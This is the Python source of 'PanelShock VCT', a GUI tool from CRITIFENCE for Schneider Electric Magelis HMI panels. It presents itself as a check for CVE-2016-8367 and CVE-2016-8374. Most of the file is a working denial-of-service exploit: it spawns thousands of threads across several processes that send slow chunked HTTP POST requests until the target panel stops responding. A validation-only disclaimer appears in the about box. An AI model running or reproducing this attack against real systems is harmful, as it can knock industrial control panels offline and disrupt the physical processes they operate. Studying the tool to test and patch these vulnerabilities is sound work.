#!/usr/bin/env python

import os
import sys
import time
import random
from random import randrange
import socket
import threading
import multiprocessing
import subprocess
import getopt

#importing wx files
import wx
import wx.richtext as rt

#importing wx GUI
import gui
from wx.lib.wordwrap import wordwrap


### DEFINE GLOBAL PARAMS ###
global status_code
status_code = 0
global p
p=0

lockCnt = threading.RLock()
exit = {}

### DEFINE CLIENT - GLOBAL PARAMS ###
global SERVER
global TCP_PORT
global THREADS
global FILE
global HOST
global KA
global THREADS_PER_CLIENT
global THREADS_INTERVAL
global BODY_LENGTH
global CHUNK_SIZE
global CHUNKS_INTERVAL
global headers
global body
global chunk_size
global verbose_mode
global slowloris





### DEFAULT SETTINGS ###
debug_mode = False



###
### YOU CAN EDIT THE PARAMETERS AT THE LINES BELOW ###
###

### SET DEFAULT SETTINGS ###
SERVER = "192.168.0.1"
TCP_PORT = 80
THREADS = 4096
FILE = "/"
HOST = "CRITIFENCE MagelisVCT v1.0.1"
KA = False


ATTACK_MODE = "PanelShock"

### User-Agent ###
ua = ["Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19",
      "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT;)",
      "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5",
      "Mozilla/5.0 (Linux; U; Android 1.5; de-de; HTC Magic Build/CRB17) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
      "Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
      "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; GTB5; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; InfoPath.2; OfficeLiveConnector.1.3; OfficeLivePatch.0.0)",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10",
      "Opera/5.11 (Windows 98; U) [en]",
      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.12 Safari/537.36 OPR/14.0.1116.4",
      "Mozilla/5.0 (Linux; U; Android-4.0.3; en-us; Galaxy Nexus Build/IML74K) AppleWebKit/535.7 (KHTML, like Gecko) CrMo/16.0.912.75 Mobile Safari/535.7",
      "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
      "Lynx/2.8.5dev.16 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7a",
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7 (via ggpht.com)",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/6.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; Tablet PC 2.0; Microsoft Outlook 15.0.4481; ms-office; MSOffice 15)",
      "Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; TmstmpExt)"]



###
### DO NOT EDIT PARAMETERS BELOW THIS LINE ###
###



### GENERAL SETTINGS ###
headers = ""
verbose_mode = False
processesArr = []

### CHUNKED CONTENT ###
BODY_LENGTH = 10000
CHUNK_SIZE = 10
CHUNKS_INTERVAL = 1.1


### THREADS SETTINGS ###
THREADS_PER_CLIENT = 250
watchdog_interval = 1
THREADS_INTERVAL = 0.001

error = 0


### redirect output to console
class RedirectText(object):
    def __init__(self,aWxTextCtrl):
         self.out=aWxTextCtrl
         self.writeLock = threading.RLock()

    def write(self,string):
        with self.writeLock:
            self.out.WriteText(string)

"""
ATTACK CLASS
"""

def chunk_data(data, chunk_size, headers):
    dl = len(data)
    ret = []
    for i in range(dl // chunk_size):
        temp = ""

        if i == 0:
            temp = headers

        temp += "%s\r\n" % (hex(chunk_size)[2:])
        temp += "%s\r\n" % (data[i * chunk_size : (i + 1) * chunk_size])
        ret.append(temp)

    if dl % chunk_size != 0:
        temp = ""
        temp += "%s\r\n" % (hex(len(data) % chunk_size)[2:])
        temp += "%s\r\n" % (data[-(len(data) % chunk_size):])
        temp += "0\r\n\r\n"
        ret.append(temp)

    else:
        ret[-1] += "0\r\n\r\n"
    
    return ret

def startSlowHTTPChunkedThrd(p, id, SERVER, TCP_PORT, THREADS, FILE, HOST, KA, THREADS_PER_CLIENT, THREADS_INTERVAL, BODY_LENGTH, CHUNK_SIZE, CHUNKS_INTERVAL, verbose_mode, headers, body, chunk_size):

    global lockCnt

    if verbose_mode == True:    
        print "\r\nHTTP Request: "+str(headers)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER, int(TCP_PORT)))
        #s.sendall(headers)
        e = 0

        with lockCnt:
            if verbose_mode == True:
                print '\r\nEntering thread [%s] ' % str(id)

        (threading.Thread(target= readSocket, args= (p, s, id, verbose_mode, ))).start()    

        print "\r\n[PanelShockVCT] Sending request to target Magelis HMI Panel: " + str(SERVER)
        for chunk in chunk_data(body, chunk_size, headers):
            if not exit[id]:
                try:
                    s.send(chunk)

                    #if CHUNKS_INTERVAL not defined by user generate random CHUNKS_INTERVAL
                    if CHUNKS_INTERVAL == 0:
                        CHUNKS_INTERVAL = random.uniform(1.00, 1.19)
                    if debug_mode == True:
                        print "\r\nCI: "+str(CHUNKS_INTERVAL)+"\r\n"

                    time.sleep(CHUNKS_INTERVAL)
                    
                except:
                    e+=1
            else:
                with lockCnt:                    
                    del(exit[id])
                s.close()
                break


    except:
        if verbose_mode == True:
            error = sys.exc_info()[1]
    if verbose_mode == True:
        print "\r\nDONE thread [%s]" % str(id)

def readSocket(p, s, id, verbose_mode):  
    global status_code

    try:
        buff = s.recv(1024)
        buff =  buff.split(' ')[1]
        if verbose_mode == True:
            print '\r\nExiting... %s' % str(buff)
        with lockCnt:
            exit[id] = True
    except:
        if status_code == 0:
            print "\r\n[PanelShockVCT] Process #"+str(p+1)+" :: Target Magelis HMI Panel message: Good night..."
            status_code = 1

        if verbose_mode == True:   
            error = sys.exc_info()[1]



def startSlowHTTPChunked(p, SERVER, TCP_PORT, THREADS, FILE, HOST, KA, THREADS_PER_CLIENT, THREADS_INTERVAL, BODY_LENGTH, CHUNK_SIZE, CHUNKS_INTERVAL, verbose_mode, headers, body, chunk_size):
    cnt = 0
    global status_code
    global lockCnt
    global watchdog_interval

    while 1:
        with lockCnt:

            try:
                global exit
                if len(exit) < THREADS:
                    (threading.Thread(target=startSlowHTTPChunkedThrd, args=(p, cnt, SERVER, TCP_PORT, THREADS, FILE, HOST, KA, THREADS_PER_CLIENT, THREADS_INTERVAL, BODY_LENGTH, CHUNK_SIZE, CHUNKS_INTERVAL, verbose_mode, headers, body, chunk_size, ))).start()
                    
                    #if THREADS_INTERVAL not defined by user generate random THREADS_INTERVAL
                    if THREADS_INTERVAL == 0:
                        THREADS_INTERVAL = random.uniform(0.001, 0.01)
                    
                    time.sleep(THREADS_INTERVAL)
                    exit[cnt] = False
                    if not cnt % (10 * int(THREADS)):
                        cnt = 0           
                    cnt+=1     
                else:
                    time.sleep(watchdog_interval)

            except:
                if status_code == 1:
                    print "\r\n[PanelShockVCT] Process #"+str(p+1)+" :: Target Magelis HMI Panel: Please Stop, I am choking..."
                    status_code = 2




class onLoad(gui.MainFrame):
    def __init__(self,parent):
        gui.MainFrame.__init__(self,parent)        
        redir=RedirectText(self.console)
        sys.stdout=redir

        # change wx frame icon
        icon = wx.EmptyIcon()
        icon.CopyFromBitmap(wx.Bitmap("images/critifence.ico", wx.BITMAP_TYPE_ANY))
        self.SetIcon(icon)

        self.textAttr = rt.RichTextAttr()
        self.SetFontStyle(fontColor=wx.Colour(0, 0, 0), fontBgColor=wx.Colour(255, 255, 255), fontFace='Arial', fontSize=10, fontBold=False, fontItalic=False, fontUnderline=False)
        self.console.SelectAll()
        #self.console.DeleteSelection()
        self.console.Clear()

        self.dos_attack.Enabled = True
        attack_type = "dos_attack"
        self.ip_addr.WriteText(str(SERVER))
        self.port.WriteText(str(TCP_PORT))

        if ATTACK_MODE == "PanelShock":
            global headers
            headers = "POST "+str(FILE)+" HTTP/1.1\r\nHost: "+str(HOST)+"\r\nUser-Agent: Blank\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"    
        
    """
    Attack Types
    """
    def dos_attack_func(self,event):
        attack_type = "dos_attack"
        self.sb.SetStatusText("")
        self.console.SelectAll()
        self.console.Clear()
        print "This attack will check if a target Magelis HMI Panel is vulnerable to Denial of Service (DoS) Attack as documented in CVE-2016-8367 and SVE-82003201."


    def pf_attack_func(self,event):
        attack_type = "pf_attack"
        self.sb.SetStatusText("")
        self.console.SelectAll()
        self.console.Clear()
        print "This attack will check if a target Magelis HMI Panel is vulnerable to HMI PanelShock Attack as documented in CVE-2016-8374 and SVE-82003202."




    def start_check(self,event):
        global error
        global service
        global status_code
        global processesArr
        global body
        global chunk_size
        global p
        self.console.SelectAll()
        self.console.Clear()

        os.system("mode con cols=80 lines=200")

        clear = lambda: os.system('cls')
        clear()

        time.sleep(2)

        SERVER = self.ip_addr.GetValue()
        TCP_PORT = self.port.GetValue()
        # set global vulnerability parameters here

        # check vulnerability type before check
        if (self.dos_attack.GetValue() == True):
            self.sb.SetStatusText("Starting Magelis HMI Panel DoS attack")
            processes = int(THREADS) / int(THREADS_PER_CLIENT)
            body = 'A' * int(BODY_LENGTH)
            chunk_size = int(CHUNK_SIZE)    
            p=0
            print "[PanelShockVCT] Launching "+str(ATTACK_MODE)+" attack!\r\n[PanelShockVCT] Starting "+str(processes)+" clients..."

            while p < processes:
                # Trigger the worker thread unless it's already busy
                try:
                    service = multiprocessing.Process(name='startSlowHTTPChunked', target=startSlowHTTPChunked, args=(p, SERVER, TCP_PORT, THREADS, FILE, HOST, KA, THREADS_PER_CLIENT, THREADS_INTERVAL, BODY_LENGTH, CHUNK_SIZE, CHUNKS_INTERVAL, verbose_mode, headers, body, chunk_size, ))
                    service.start()
                    processesArr.append(service)
                    p+=1
                except:
                    print "status: "+str(status_code)

            print "[PanelShockVCT] Target HMI Panel Device is under attack!"


        if (self.pf_attack.GetValue() == True):
            self.sb.SetStatusText("Starting Magelis HMI PanelShock attack")

            processes = int(THREADS) / int(THREADS_PER_CLIENT)
            body = 'A' * int(BODY_LENGTH)
            chunk_size = int(CHUNK_SIZE)    
            p=0
            print "[PanelShockVCT] Launching "+str(ATTACK_MODE)+" attack!\r\n[PanelShockVCT] Starting "+str(processes)+" clients..."

            while p < processes:
                # Trigger the worker thread unless it's already busy
                try:
                    service = multiprocessing.Process(name='startSlowHTTPChunked', target=startSlowHTTPChunked, args=(p, SERVER, TCP_PORT, THREADS, FILE, HOST, KA, THREADS_PER_CLIENT, THREADS_INTERVAL, BODY_LENGTH, CHUNK_SIZE, CHUNKS_INTERVAL, verbose_mode, headers, body, chunk_size, ))
                    service.start()
                    processesArr.append(service)
                    p+=1
                except:
                    print "status: "+str(status_code)

            print "[PanelShockVCT] Target HMI Panel Device is under attack!"




    def SetFontStyle(self, fontColor = None, fontBgColor = None, fontFace = None, fontSize = None,
                     fontBold = None, fontItalic = None, fontUnderline = None):
      if fontColor:
         self.textAttr.SetTextColour(fontColor)
      if fontBgColor:
         self.textAttr.SetBackgroundColour(fontBgColor)
      if fontFace:
         self.textAttr.SetFontFaceName(fontFace)
      if fontSize:
         self.textAttr.SetFontSize(fontSize)
      if fontBold != None:
         if fontBold:
            self.textAttr.SetFontWeight(wx.FONTWEIGHT_BOLD)
         else:
            self.textAttr.SetFontWeight(wx.FONTWEIGHT_NORMAL)
      if fontItalic != None:
         if fontItalic:
            self.textAttr.SetFontStyle(wx.FONTSTYLE_ITALIC)
         else:
            self.textAttr.SetFontStyle(wx.FONTSTYLE_NORMAL)
      if fontUnderline != None:
         if fontUnderline:
            self.textAttr.SetFontUnderlined(True)
         else:
            self.textAttr.SetFontUnderlined(False)
      self.console.SetDefaultStyle(self.textAttr)


    def aboutFunc(self, event):
        overview = "\r\n\r\nPanelShock VCT | Schneider Electric Magelis HMI is a Vulnerability Check Tool for Magelis HMI PanelShock and Denial of Service vulnerabilities (CVE-2016-8367 and CVE-2016-8374) found in the Web Gate HTTP Server.\r\n\r\nThe vulnerabilities discovered in April 2016 by Eran Goldstein. \r\n\r\n"
        licenseText = "This tool intended for validation and check purposes only! \r\n It is strongly recommended that you do not \r\n use this tool for illegal purposes or in any production environment. \r\n\r\nWARNING:\r\nCRITIFENCE will not be responsible for any damage\r\nthat caused by using this tool."
        info = wx.AboutDialogInfo()
        info.Name = "PanelShock VCT"
        info.Version = "1.0.1"
        info.Copyright = "2016 (c) CRITIFENCE. All rights reserved."
        info.Description = wordwrap(overview,350, wx.ClientDC(self))
        info.WebSite = ("http://www.critifence.com", "CRITIFENCE official website")
        info.Developers = [ "Powered by SCADAGate+ Analyzer", "Eran Goldstein" ]
        info.License = wordwrap(licenseText, 350, wx.ClientDC(self))
        wx.AboutBox(info)

    def updateFunc(self, event):
        overview = "\r\n\r\nCheck for PanelShock VCT Tool updates \r\n"
        #licenseText = "This tool intended for validation and check purposes only! \r\n It is strongly recommended that you do not \r\n use this tool for illegal purposes or in any production environment. \r\n\r\nWARNING:\r\nCRITIFENCE will not be responsible for any damage\r\nthat caused by using this tool."
        info = wx.AboutDialogInfo()
        info.Name = "PanelShock VCT"
        info.Version = "1.0.1"
        info.Copyright = "2016 (c) CRITIFENCE. All rights reserved."
        info.Description = wordwrap(overview,350, wx.ClientDC(self))
        info.WebSite = ("http://www.critifence.com/vct/panel_shock/", "Check for Updates\r\n\r\n")
        #info.Developers = [ "Powered by SCADAGate+ Analyzer", "Eran Goldstein" ]
        #info.License = wordwrap(licenseText, 350, wx.ClientDC(self))
        wx.AboutBox(info)


    def exitFunc(self, event):
        sys.exit(0)




if __name__ == '__main__':
    try:
        # eliminated from pyinstall to open instance for every process
        multiprocessing.freeze_support()

        app = wx.App(False)
        frame = onLoad(None)
        frame.Show(True)
        app.MainLoop()

    except:
        error = sys.exc_info()[0]
        print "[PanelShockVCT] Unable to start gui application\t"+str(error)

